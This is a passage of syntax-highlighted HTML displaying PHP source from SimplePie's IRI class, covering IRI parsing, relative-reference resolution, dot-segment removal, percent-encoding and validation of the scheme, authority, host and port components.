class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $fragment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Whether the object represents a valid IRI</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $valid = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return the entire IRI when you try and read the object as a string</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get_iri();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a new IRI object, from a specified string</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $iri</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> SimplePie_IRI</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SimplePie_IRI</span><span class="params">($iri)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$iri = (string) $iri;</span><br><span class="line"><span class="keyword">if</span> ($iri !== <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line">$parsed = <span class="keyword">$this</span>-&gt;parse_iri($iri);</span><br><span class="line"><span class="keyword">$this</span>-&gt;set_scheme($parsed[<span class="string">'scheme'</span>]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;set_authority($parsed[<span class="string">'authority'</span>]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;set_path($parsed[<span class="string">'path'</span>]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;set_query($parsed[<span class="string">'query'</span>]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;set_fragment($parsed[<span class="string">'fragment'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a new IRI object by resolving a relative IRI</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@static</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> SimplePie_IRI $base Base IRI</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $relative Relative IRI</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> SimplePie_IRI</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">absolutize</span><span class="params">($base, $relative)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$relative = (string) $relative;</span><br><span class="line"><span class="keyword">if</span> ($relative !== <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line">$relative = <span class="keyword">new</span> SimplePie_IRI($relative);</span><br><span class="line"><span class="keyword">if</span> ($relative-&gt;get_scheme() !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$target = $relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($base-&gt;get_iri() !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ($relative-&gt;get_authority() !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$target = $relative;</span><br><span class="line">$target-&gt;set_scheme($base-&gt;get_scheme());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$target = <span class="keyword">new</span> SimplePie_IRI(<span class="string">''</span>);</span><br><span class="line">$target-&gt;set_scheme($base-&gt;get_scheme());</span><br><span class="line">$target-&gt;set_userinfo($base-&gt;get_userinfo());</span><br><span class="line">$target-&gt;set_host($base-&gt;get_host());</span><br><span class="line">$target-&gt;set_port($base-&gt;get_port());</span><br><span class="line"><span class="keyword">if</span> ($relative-&gt;get_path() !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos($relative-&gt;get_path(), <span class="string">'/'</span>) === <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$target-&gt;set_path($relative-&gt;get_path());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (($base-&gt;get_userinfo() !== <span class="keyword">null</span> || $base-&gt;get_host() !== <span class="keyword">null</span> || $base-&gt;get_port() !== <span class="keyword">null</span>) &amp;&amp; $base-&gt;get_path() === <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$target-&gt;set_path(<span class="string">'/'</span> . $relative-&gt;get_path());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (($last_segment = strrpos($base-&gt;get_path(), <span class="string">'/'</span>)) !== <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">$target-&gt;set_path(substr($base-&gt;get_path(), <span class="number">0</span>, $last_segment + <span class="number">1</span>) . $relative-&gt;get_path());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$target-&gt;set_path($relative-&gt;get_path());</span><br><span class="line">&#125;</span><br><span class="line">$target-&gt;set_query($relative-&gt;get_query());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$target-&gt;set_path($base-&gt;get_path());</span><br><span class="line"><span class="keyword">if</span> ($relative-&gt;get_query() !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$target-&gt;set_query($relative-&gt;get_query());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($base-&gt;get_query() !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$target-&gt;set_query($base-&gt;get_query());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$target-&gt;set_fragment($relative-&gt;get_fragment());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// No base URL, just return the relative URL</span></span><br><span class="line">$target = $relative;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$target = $base;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $target;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Parse an IRI into scheme/authority/path/query/fragment segments</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $iri</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_iri</span><span class="params">($iri)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">preg_match(<span class="string">'/^(([^:\/?#]+):)?(\/\/([^\/?#]*))?([^?#]*)(\?([^#]*))?(#(.*))?$/'</span>, $iri, $match);</span><br><span class="line"><span class="keyword">for</span> ($i = count($match); $i &lt;= <span class="number">9</span>; $i++)</span><br><span class="line">&#123;</span><br><span class="line">$match[$i] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'scheme'</span> =&gt; $match[<span class="number">2</span>], <span class="string">'authority'</span> =&gt; $match[<span class="number">4</span>], <span class="string">'path'</span> =&gt; $match[<span class="number">5</span>], <span class="string">'query'</span> =&gt; $match[<span class="number">7</span>], <span class="string">'fragment'</span> =&gt; $match[<span class="number">9</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Remove dot segments from a path</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $input</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove_dot_segments</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$output = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">while</span> (strpos($input, <span class="string">'./'</span>) !== <span class="keyword">false</span> || strpos($input, <span class="string">'/.'</span>) !== <span class="keyword">false</span> || $input === <span class="string">'.'</span> || $input === <span class="string">'..'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// A: If the input buffer begins with a prefix of "../" or "./", then remove that prefix from the input buffer; otherwise,</span></span><br><span class="line"><span class="keyword">if</span> (strpos($input, <span class="string">'../'</span>) === <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$input = substr($input, <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (strpos($input, <span class="string">'./'</span>) === <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$input = substr($input, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// B: if the input buffer begins with a prefix of "/./" or "/.", where "." is a complete path segment, then replace that prefix with "/" in the input buffer; otherwise,</span></span><br><span class="line"><span class="keyword">elseif</span> (strpos($input, <span class="string">'/./'</span>) === <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$input = substr_replace($input, <span class="string">'/'</span>, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($input === <span class="string">'/.'</span>)</span><br><span class="line">&#123;</span><br><span class="line">$input = <span class="string">'/'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// C: if the input buffer begins with a prefix of "/../" or "/..", where ".." is a complete path segment, then replace that prefix with "/" in the input buffer and remove the last segment and its preceding "/" (if any) from the output buffer; otherwise,</span></span><br><span class="line"><span class="keyword">elseif</span> (strpos($input, <span class="string">'/../'</span>) === <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$input = substr_replace($input, <span class="string">'/'</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">$output = substr_replace($output, <span class="string">''</span>, strrpos($output, <span class="string">'/'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($input === <span class="string">'/..'</span>)</span><br><span class="line">&#123;</span><br><span class="line">$input = <span class="string">'/'</span>;</span><br><span class="line">$output = substr_replace($output, <span class="string">''</span>, strrpos($output, <span class="string">'/'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// D: if the input buffer consists only of "." or "..", then remove that from the input buffer; otherwise,</span></span><br><span class="line"><span class="keyword">elseif</span> ($input === <span class="string">'.'</span> || $input === <span class="string">'..'</span>)</span><br><span class="line">&#123;</span><br><span class="line">$input = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// E: move the first path segment in the input buffer to the end of the output buffer, including the initial "/" character (if any) and any subsequent characters up to, but not including, the next "/" character or the end of the input buffer</span></span><br><span class="line"><span class="keyword">elseif</span> (($pos = strpos($input, <span class="string">'/'</span>, <span class="number">1</span>)) !== <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">$output .= substr($input, <span class="number">0</span>, $pos);</span><br><span class="line">$input = substr_replace($input, <span class="string">''</span>, <span class="number">0</span>, $pos);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$output .= $input;</span><br><span class="line">$input = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $output . $input;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Replace invalid character with percent encoding</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $string Input string</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $valid_chars Valid characters</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int $case Normalise case</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace_invalid_with_pct_encoding</span><span class="params">($string, $valid_chars, $case = SIMPLEPIE_SAME_CASE)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Normalise case</span></span><br><span class="line"><span class="keyword">if</span> ($case &amp; SIMPLEPIE_LOWERCASE)</span><br><span class="line">&#123;</span><br><span class="line">$string = strtolower($string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($case &amp; SIMPLEPIE_UPPERCASE)</span><br><span class="line">&#123;</span><br><span class="line">$string = strtoupper($string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Store position and string length (to avoid constantly recalculating this)</span></span><br><span class="line">$position = <span class="number">0</span>;</span><br><span class="line">$strlen = strlen($string);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Loop as long as we have invalid characters, advancing the position to the next invalid character</span></span><br><span class="line"><span class="keyword">while</span> (($position += strspn($string, $valid_chars, $position)) &lt; $strlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// If we have a % character</span></span><br><span class="line"><span class="keyword">if</span> ($string[$position] === <span class="string">'%'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// If we have a pct-encoded section</span></span><br><span class="line"><span class="keyword">if</span> ($position + <span class="number">2</span> &lt; $strlen &amp;&amp; strspn($string, <span class="string">'0123456789ABCDEFabcdef'</span>, $position + <span class="number">1</span>, <span class="number">2</span>) === <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Get the the represented character</span></span><br><span class="line">$chr = chr(hexdec(substr($string, $position + <span class="number">1</span>, <span class="number">2</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// If the character is valid, replace the pct-encoded with the actual character while normalising case</span></span><br><span class="line"><span class="keyword">if</span> (strpos($valid_chars, $chr) !== <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ($case &amp; SIMPLEPIE_LOWERCASE)</span><br><span class="line">&#123;</span><br><span class="line">$chr = strtolower($chr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($case &amp; SIMPLEPIE_UPPERCASE)</span><br><span class="line">&#123;</span><br><span class="line">$chr = strtoupper($chr);</span><br><span class="line">&#125;</span><br><span class="line">$string = substr_replace($string, $chr, $position, <span class="number">3</span>);</span><br><span class="line">$strlen -= <span class="number">2</span>;</span><br><span class="line">$position++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Otherwise just normalise the pct-encoded to uppercase</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$string = substr_replace($string, strtoupper(substr($string, $position + <span class="number">1</span>, <span class="number">2</span>)), $position + <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">$position += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// If we don't have a pct-encoded section, just replace the % with its own esccaped form</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$string = substr_replace($string, <span class="string">'%25'</span>, $position, <span class="number">1</span>);</span><br><span class="line">$strlen += <span class="number">2</span>;</span><br><span class="line">$position += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// If we have an invalid character, change into its pct-encoded form</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$replacement = sprintf(<span class="string">"%%%02X"</span>, ord($string[$position]));</span><br><span class="line">$string = str_replace($string[$position], $replacement, $string);</span><br><span class="line">$strlen = strlen($string);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Check if the object represents a valid IRI</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> array_sum(<span class="keyword">$this</span>-&gt;valid) === count(<span class="keyword">$this</span>-&gt;valid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the scheme. Returns true on success, false on failure (if there are</span></span><br><span class="line"><span class="comment"> * any invalid characters).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $scheme</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_scheme</span><span class="params">($scheme)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($scheme === <span class="keyword">null</span> || $scheme === <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;scheme = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$len = strlen($scheme);</span><br><span class="line"><span class="keyword">switch</span> (<span class="keyword">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> $len &gt; <span class="number">1</span>:</span><br><span class="line"><span class="keyword">if</span> (!strspn($scheme, <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-.'</span>, <span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;scheme = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> $len &gt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> (!strspn($scheme, <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span>, <span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;scheme = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;scheme = strtolower($scheme);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the authority. Returns true on success, false on failure (if there are</span></span><br><span class="line"><span class="comment"> * any invalid characters).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $authority</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_authority</span><span class="params">($authority)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (($userinfo_end = strrpos($authority, <span class="string">'@'</span>)) !== <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">$userinfo = substr($authority, <span class="number">0</span>, $userinfo_end);</span><br><span class="line">$authority = substr($authority, $userinfo_end + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$userinfo = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (($port_start = strpos($authority, <span class="string">':'</span>)) !== <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">$port = substr($authority, $port_start + <span class="number">1</span>);</span><br><span class="line">$authority = substr($authority, <span class="number">0</span>, $port_start);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$port = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;set_userinfo($userinfo) &amp;&amp; <span class="keyword">$this</span>-&gt;set_host($authority) &amp;&amp; <span class="keyword">$this</span>-&gt;set_port($port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the userinfo.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $userinfo</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_userinfo</span><span class="params">($userinfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($userinfo === <span class="keyword">null</span> || $userinfo === <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;userinfo = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;userinfo = <span class="keyword">$this</span>-&gt;replace_invalid_with_pct_encoding($userinfo, <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&amp;\'()*+,;=:'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the host. Returns true on success, false on failure (if there are</span></span><br><span class="line"><span class="comment"> * any invalid characters).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $host</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_host</span><span class="params">($host)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($host === <span class="keyword">null</span> || $host === <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;host = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($host[<span class="number">0</span>] === <span class="string">'['</span> &amp;&amp; substr($host, <span class="number">-1</span>) === <span class="string">']'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Net_IPv6::checkIPv6(substr($host, <span class="number">1</span>, <span class="number">-1</span>)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;host = $host;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;host = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;host = <span class="keyword">$this</span>-&gt;replace_invalid_with_pct_encoding($host, <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&amp;\'()*+,;='</span>, SIMPLEPIE_LOWERCASE);</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the port. Returns true on success, false on failure (if there are</span></span><br><span class="line"><span class="comment"> * any invalid characters).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $port</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_port</span><span class="params">($port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($port === <span class="keyword">null</span> || $port === <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;port = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (strspn($port, <span class="string">'0123456789'</span>) === strlen($port))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;port = (int) $port;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;port = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the path.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $path</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_path</span><span class="params">($path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($path === <span class="keyword">null</span> || $path === <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;path = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span 